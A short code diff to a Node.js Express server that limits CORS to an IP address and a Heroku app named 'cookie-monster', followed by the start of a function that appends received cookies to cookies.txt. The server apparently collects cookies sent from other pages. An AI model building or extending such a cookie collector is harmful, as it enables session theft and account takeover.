@@ -14,7 +14,9 @@ const port = process.env.PORT || 3000;
 app.use( bodyParser.json() );       // to support JSON-encoded bodies
 app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
  extended: true})); 
-app.use(cors());
+ app.use(cors({
+    origin: ['http://65.21.255.24/', 'https://cookie-monster-jfam.herokuapp.com/', 'http://cookie-monster-jfam.herokuapp.com/']
+}));
 
 var cookieFunc = function(cookie){
     fs.appendFile('cookies.txt', cookie, function (err){
